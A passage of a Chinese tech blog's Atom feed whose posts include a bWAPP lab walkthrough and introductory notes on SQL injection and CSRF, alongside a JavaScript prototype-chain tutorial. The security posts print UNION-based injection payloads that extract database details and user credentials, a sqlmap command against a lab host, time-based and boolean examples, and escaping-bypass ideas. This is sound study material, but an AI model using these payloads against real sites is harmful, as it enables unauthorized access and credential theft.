src="https://raw.githubusercontent.com/yejuns/imgs/main/essay/bwapp-5.png" alt="确定sql注入点"></p></li><li><p>确定可注入的字段的位置,构造相关的字段</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span><span class="comment">#</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,database(),version(),user(),5,6,7#</span></span><br></pre></td></tr></table></figure><p><img src="..%5Cimgs%5Cweb%5Cbwapp-6.png"><br><img src="..%5Cimgs%5Cweb%5Cbwapp-7.png"></p></li><li><p>使用同样的构造方法可以确认出表名、数据库名,用户名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">database</span>(),<span class="keyword">version</span>(),<span class="keyword">user</span>(),table_name,<span class="number">6</span>,<span class="number">7</span> <span class="keyword">from</span> information_schema.tables<span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,login,Password,email,secret,6,7 from users#</span></span><br></pre></td></tr></table></figure></li></ol><p>也可以直接用<code>sqlmap</code>跑出来</p><p><code>sqlmap -u &quot;http://192.168.50.151/sqli_1.php?title=aaa&amp;action=search&quot;</code></p><h3 id="medium-1"><a href="#medium-1" class="headerlink" title="medium"></a>medium</h3><p>对输入的数据进行了<code>addslashes</code>处理，<code>addslashes</code>只会对<code>&#39; &quot; \</code>进行转义操作，绕过方式</p><ol><li>宽字节注入（数据库默认是latin1编码，要想注入成功，需要将编码改为GBK）</li><li>编码解码导致的绕过（原因是字符串在带入查询前，被做了一些编码解码操作而没有再做一次过滤）</li></ol><h2 id="后面的大致思路都差不多"><a href="#后面的大致思路都差不多" class="headerlink" title="后面的大致思路都差不多"></a>后面的大致思路都差不多</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;网络上相关的笔记也很多，但有些地方感觉还是得说得更清楚一些&lt;/p&gt;
&lt;h2 id=&quot;HTML-Injection-Reflection-Get&quot;&gt;&lt;a href=&quot;#HTML-Injection-Reflection-Get&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    
    <category term="靶场" scheme="http://yejuns.github.io/tags/%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>js原型链</title>
    <link href="http://yejuns.github.io/2020/12/31/js%E5%8E%9F%E5%9E%8B%E9%93%BE/"/>
    <id>http://yejuns.github.io/2020/12/31/js%E5%8E%9F%E5%9E%8B%E9%93%BE/</id>
    <published>2020-12-31T08:01:51.000Z</published>
    <updated>2021-06-01T03:21:56.544Z</updated>
    
    <content type="html"><![CDATA[<h2 id="重点"><a href="#重点" class="headerlink" title="重点"></a>重点</h2><h3 id="原型链最重要的是记住这三点"><a href="#原型链最重要的是记住这三点" class="headerlink" title="原型链最重要的是记住这三点"></a>原型链最重要的是记住这三点</h3><blockquote><ol><li><code>__proto__</code>、 <code>constructor</code> 属性是对象所独有的；</li><li><code>prototype</code> 属性是函数独有的；</li><li>上面说过js中函数也是对象的一种，那么函数同样也有属性<code>__proto__</code>、 <code>constructor</code>；</li><li>也就是说，普通对象（比如 {a:1}）没有prototype属性—不明白</li></ol></blockquote><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><ul><li>想要弄清楚原型和原型链，这几个属性必须要搞清楚，<code>__proto__</code> 、<code>prototype</code> 、 <code>constructor</code>。</li><li>其次你要知道js中对象和函数的关系，函数其实是对象的一种。</li><li>最后你要知道函数、构造函数的区别，任何函数都可以作为构造函数，但是并不能将任意函数叫做构造函数，只有当一个函数通过new关键字调用的时候才可以成为构造函数。如：<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> Parent = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//定义一个函数，那它只是一个普通的函数，下面我们让这个函数变得不普通</span></span><br><span class="line"><span class="keyword">var</span> p1 = <span class="keyword">new</span> Parent();</span><br><span class="line"><span class="comment">//这时这个Parent就不是普通的函数了，它现在是一个构造函数。因为通过new关键字调用了它</span></span><br><span class="line"><span class="comment">//创建了一个Parent构造函数的实例 p1</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="prototype属性"><a href="#prototype属性" class="headerlink" title="prototype属性"></a>prototype属性</h2><p>它是函数独有的属性，从一个函数指向另一个对象，代表这个对象是这个函数的原型对象，这个对象也是当前函数所创建的实例的原型对象。<br>prototype设计之初就是为了实现继承，让由特定函数创建的所有实例共享属性和方法，也可以说是让某一个构造函数实例化的所有对象可以找到公共的方法和属性。有了prototype我们不需要为每一个实例创建重复的属性方法，而是将属性方法创建在构造函数的原型对象上（prototype）。那些不需要共享的才创建在构造函数中。<br>继续引用上面的代码，当我们想为通过Parent实例化的所有实例添加一个共享的属性时，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Parent.prototype.name &#x3D; &quot;我是原型属性，所有实例都可以读取到我&quot;;</span><br></pre></td></tr></table></figure><p>这就是原型属性，当然也可以添加原型方法。那问题来了，p1怎么知道他的原型对象上有这个方法呢，往下看↓↓↓</p><h2 id="proto属性"><a href="#proto属性" class="headerlink" title="proto属性"></a>proto属性</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__proto__属性相当于指向prototype唯一的指针</span><br></pre></td></tr></table></figure><p><code>__proto__</code> 属性告诉我们一个对象的原型是什么.</p><p>我们说了，Parent.prototype上添加的属性和方法叫做原型属性和原型方法，该构造函数的实例都可以访问调用。那这个构造函数的原型上的属性和方法，怎么能和构造函数的实例联系在一起呢，就是通过__proto__属性。每个对象都有__proto__属性，该属性指向的就是该对象的原型。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p1.__proto__ === Parent.prototype; <span class="comment">// true</span></span><br></pre></td></tr></table></figure><ul><li>p1.prototype 是错误的<br>(可以理解为，在new出一个实例对象后，需要让new出的对象可以指向原型，因此设置了_proto_属性)</li></ul><p><code>__proto__</code>通常称为隐式原型，<code>prototype</code>通常称为显式原型，那我们可以说一个对象的隐式原型指向了该对象的构造函数的显式原型。那么我们在显式原型上定义的属性方法，通过隐式原型传递给了构造函数的实例。这样一来实例就能很容易的访问到构造函数原型上的方法和属性了。<br>我们之前也说过<code>__proto__</code>属性是对象（包括函数）独有的，那么<code>Parent.prototype</code>也是对象，那它有隐式原型么？又指向谁？</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Parent.prototype.__proto__ === <span class="built_in">Object</span>.prototype; <span class="comment">//true</span></span><br></pre></td></tr></table></figure><p>可以看到，构造函数的原型对象上的隐式原型对象指向了Object的原型对象。那么Parent的原型对象就继承了Object的原型对象。由此我们可以验证一个结论，万物继承自Object.prototype。这也就是为什么我们可以实例化一个对象，并且可以调用该对象上没有的属性和方法了。如：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//我们并没有在Parent中定义任何方法属性，但是我们可以调用</span></span><br><span class="line">p1.toString();<span class="comment">//hasOwnProperty 等等的一些方法</span></span><br></pre></td></tr></table></figure><p>我们可以调用很多我们没有定义的方法，这些方法是哪来的呢？现在引出原型链的概念，当我们调用p1.toString()的时候，先在p1对象本身寻找，没有找到则通过p1.__proto__找到了原型对象Parent.prototype，也没有找到，又通过Parent.prototype.__proto__找到了上一层原型对象Object.prototype。在这一层找到了toString方法。返回该方法供p1使用。</p><p>当然如果找到Object.prototype上也没找到，就在Object.prototype.__proto__中寻找，但是<code>Object.prototype.__proto__ === null</code>所以就返回undefined。这就是为什么当访问对象中一个不存在的属性时，返回undefined了。</p><h2 id="constructor属性"><a href="#constructor属性" class="headerlink" title="constructor属性"></a>constructor属性</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">age</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.age = age;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> per1 = <span class="keyword">new</span> Person(<span class="number">12</span>);</span><br><span class="line"><span class="keyword">var</span> per2 = <span class="keyword">new</span> Person(<span class="number">13</span>);</span><br></pre></td></tr></table></figure><p>上面的例子中per1、per2都是Person的实例，这两个实例都有一个constructor属性，该属性（是一个指针）指向Person。（要把Person（）看成是构造函数）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">console.log(per1.constructor &#x3D;&#x3D; per2.constructor &#x3D;&#x3D; Person); &#x2F;&#x2F;true</span><br></pre></td></tr></table></figure><p>函数的<code>prototype</code>对象都包含一个<code>constructor</code>的属性，<code>constructor</code>指向当前构造函数</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;重点&quot;&gt;&lt;a href=&quot;#重点&quot; class=&quot;headerlink&quot; title=&quot;重点&quot;&gt;&lt;/a&gt;重点&lt;/h2&gt;&lt;h3 id=&quot;原型链最重要的是记住这三点&quot;&gt;&lt;a href=&quot;#原型链最重要的是记住这三点&quot; class=&quot;headerlink&quot; title=</summary>
      
    
    
    
    
    <category term="javaScript" scheme="http://yejuns.github.io/tags/javaScript/"/>
    
  </entry>
  
  <entry>
    <title>web安全之CSRF</title>
    <link href="http://yejuns.github.io/2020/12/31/web%E5%AE%89%E5%85%A8%E4%B9%8BCSRF/"/>
    <id>http://yejuns.github.io/2020/12/31/web%E5%AE%89%E5%85%A8%E4%B9%8BCSRF/</id>
    <published>2020-12-31T08:01:51.000Z</published>
    <updated>2021-07-02T08:40:17.090Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>数据包的中Cookie 的值是浏览器从本地存储中取出，并自动填充到数据包中。</p><p>如果攻击者控制了用户浏览器并且窃取了cookie。</p><p>浏览器会自动完成Cookie 的填充，目标网站会误认为该数据包就是管理员发送的，会以管理员的权限进行相关的操作。</p><h2 id="CSRF的原因"><a href="#CSRF的原因" class="headerlink" title="CSRF的原因"></a>CSRF的原因</h2><p>HTTP 是一种无状态协议，即服务器不会保留与客户交易时的状态。</p><p>用户A 在很短的时间间隔内向Web服务器发送了两次同样的请求，服务器并不会因为已经响应了该请求一次就不对第二次请求进行响应，因为服务器并不知道已经响应过一次该请求。</p><p>假设用户在网站A的某一个页面上已经完成了登录操作，当在该网站的另一个页面上执行的操作需要验证用户登录的时候任然需要用户再次登录，因为HTTP 并不知道你已经登录，它不会维持你的登录状态。</p><p>为了让服务器能够记住用户引入了Cookie 机制。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;CSRF&quot;&gt;&lt;a href=&quot;#CSRF&quot; class=&quot;headerlink&quot; title=&quot;CSRF&quot;&gt;&lt;/a&gt;CSRF&lt;/h2&gt;&lt;p&gt;数据包的中Cookie 的值是浏览器从本地存储中取出，并自动填充到数据包中。&lt;/p&gt;
&lt;p&gt;如果攻击者控制了用户浏览器并且窃</summary>
      
    
    
    
    
    <category term="web安全" scheme="http://yejuns.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>web安全之SQL注入一</title>
    <link href="http://yejuns.github.io/2020/12/31/web%E5%AE%89%E5%85%A8%E4%B9%8BSQL%E6%B3%A8%E5%85%A5-1/"/>
    <id>http://yejuns.github.io/2020/12/31/web%E5%AE%89%E5%85%A8%E4%B9%8BSQL%E6%B3%A8%E5%85%A5-1/</id>
    <published>2020-12-31T08:01:51.000Z</published>
    <updated>2021-07-05T06:02:16.858Z</updated>
    
    <content type="html"><![CDATA[<h2 id="SQL注入的原理"><a href="#SQL注入的原理" class="headerlink" title="SQL注入的原理"></a>SQL注入的原理</h2><p>是发生于<code>应用程序与数据库层</code>的安全漏洞</p><p>网站内部直接发送的SQL请求一般不会有危险，但实际情况是很多时候需要结合用户的输入数据动态构造SQL语句，如果用户输入的数据被构造成恶意SQL代码，Web应用又未对动态构造的SQL语句使用的参数进行审查，则会带来意想不到的危险。</p><h3 id="简单示例"><a href="#简单示例" class="headerlink" title="简单示例"></a>简单示例</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span>,<span class="keyword">name</span> <span class="keyword">from</span> <span class="keyword">test</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> </span><br><span class="line"><span class="comment"># 用户输入，用 1 or 1=1 代替 1</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">id</span>,<span class="keyword">name</span> <span class="keyword">from</span> <span class="keyword">test</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span></span><br><span class="line"><span class="comment"># 最后产生的效果类似 select id,name from test</span></span><br><span class="line"><span class="comment"># 实现了一个越权操作</span></span><br></pre></td></tr></table></figure><h3 id="常用的数据库操作"><a href="#常用的数据库操作" class="headerlink" title="常用的数据库操作"></a>常用的数据库操作</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">version</span>();    <span class="comment"># 显示数据库版本</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">database</span>();   <span class="comment"># 查看当前正在使用的数据库</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">user</span>();       <span class="comment"># 查看使用当前数据库的用户</span></span><br><span class="line"><span class="keyword">select</span> @@datadir;    <span class="comment"># 查看数据库路径</span></span><br><span class="line"><span class="keyword">select</span> @@version_compile_os <span class="comment"># 查看数据库安装的操作系统</span></span><br></pre></td></tr></table></figure><h3 id="渗透过程中使用的数据库和表"><a href="#渗透过程中使用的数据库和表" class="headerlink" title="渗透过程中使用的数据库和表"></a>渗透过程中使用的数据库和表</h3><p><code>information_schema</code> ，是信息数据库。其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等</p><ol><li><code>SCHEMATA</code>表：提供了当前MySQL实例中所有数据库的信息。是show databases的结果取之此表</li><li><code>TABLES</code>表：提供了关于数据库中的表的信息（包括视图）</li><li><code>COLUMNS</code>表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。</li></ol><h3 id="常用构造注入方法"><a href="#常用构造注入方法" class="headerlink" title="常用构造注入方法"></a>常用构造注入方法</h3><p>使用union语句，<code>select 1,2 union select 1,2</code></p><h2 id="SQL注入类型"><a href="#SQL注入类型" class="headerlink" title="SQL注入类型"></a>SQL注入类型</h2><h3 id="按网络协议分"><a href="#按网络协议分" class="headerlink" title="按网络协议分"></a>按网络协议分</h3><ol><li>get注入</li><li>post注入</li></ol><h3 id="按注入的方式分"><a href="#按注入的方式分" class="headerlink" title="按注入的方式分"></a>按注入的方式分</h3><ol><li>Boolean-based blind SQL injection（布尔型注入）<br>     例如： <a href="http://test.com/view?id=1">http://test.com/view?id=1</a> and substring(version(),1,1)=5</li><li>UNION query SQL injection（联合查询注入）, <br>                    例如：使用union语句，<code>select 1,2 union select 1,2</code></li><li>Time-based blind SQL injection（基于时间延迟注入），<br> 例如：使用sleep(3)函数，select * from user where id= ‘4’ and sleep(3)</li><li>Error-based SQL injection（报错型注入）</li><li>Stacked queries SQL injection（可多语句查询注入）</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;SQL注入的原理&quot;&gt;&lt;a href=&quot;#SQL注入的原理&quot; class=&quot;headerlink&quot; title=&quot;SQL注入的原理&quot;&gt;&lt;/a&gt;SQL注入的原理&lt;/h2&gt;&lt;p&gt;是发生于&lt;code&gt;应用程序与数据库层&lt;/code&gt;的安全漏洞&lt;/p&gt;
&lt;p&gt;网站内部直接发</summary>
      
    
    
    
    
    <category term="SQL注入" scheme="http://yejuns.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
</feed>
